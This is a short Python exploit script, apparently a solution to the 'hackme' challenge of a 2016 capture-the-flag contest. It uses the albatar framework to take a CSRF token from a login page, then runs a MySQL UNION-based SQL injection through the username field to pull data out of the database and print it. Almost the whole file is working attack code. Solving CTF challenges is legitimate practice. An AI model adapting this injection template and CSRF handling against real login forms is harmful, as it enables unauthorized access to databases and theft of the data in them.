# su-ctf-2016 hackme

from albatar import *
import re
from urllib.parse import quote

PROXIES = {} #'http': 'http://127.0.0.1:8082', 'https': 'http://127.0.0.1:8082'}
HEADERS = ['User-Agent: Mozilla/5.0']

def extract_results(headers, body, time):
  return re.findall(':ABC:(.+?):ABC:', body, re.S)

class Requester_CSRF(Requester_HTTP_requests):

  def test(self, payload):
    response = self.session.get('http://ctf.sharif.edu:35455/chal/hackme/8b784460681e5282/login.php')
    token = re.search("name='user_token' value='([^']+)'", response.text).group(1)
    self.http_opts[2] = self.http_opts[2].replace('_CSRF_', token)

    return super(Requester_CSRF, self).test(payload)

def mysql_union():

  def make_requester():
    return Requester_CSRF(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://ctf.sharif.edu:35455/chal/hackme/8b784460681e5282/login.php',
      body = 'username=${injection}&password=asdf&Login=Login&user_token=_CSRF_',
      method = 'POST',
      response_processor = extract_results,
      encode_payload = quote,
      )

  template = "a' union select concat(0x3a4142433a,X,0x3a4142433a),null,null,null from ${query} #"

  return Method_union(make_requester, template, pager=10)

sqli = MySQL_Inband(mysql_union())

for r in sqli.exploit():
  print(r)
